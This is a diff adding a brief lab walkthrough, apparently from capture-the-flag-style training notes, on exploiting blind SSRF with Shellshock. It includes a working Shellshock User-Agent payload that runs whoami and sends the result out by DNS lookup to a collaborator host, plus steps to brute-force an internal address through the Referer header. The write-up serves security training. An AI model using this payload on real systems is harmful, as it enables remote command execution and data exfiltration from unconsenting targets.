@@ -46,3 +46,13 @@
 
 -----------------------------------------------------------------------------------------
 
+#6 Lab: Blind SSRF with Shellshock exploitation
+
+  1. Check any product and send the request to repeater.
+  2. User Agent is vulnerable to shellshock so we'll add payload in user agent
+     User-agent: () { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN
+  3. Change Referrer to Referer: http://192.168.0.x:8080 and bruteforce and checkc collaborator for interaction
+  4  Fetch the username from the collaborator and submit the answer.
+
+---------------------------------------------------------------------------------------------
+
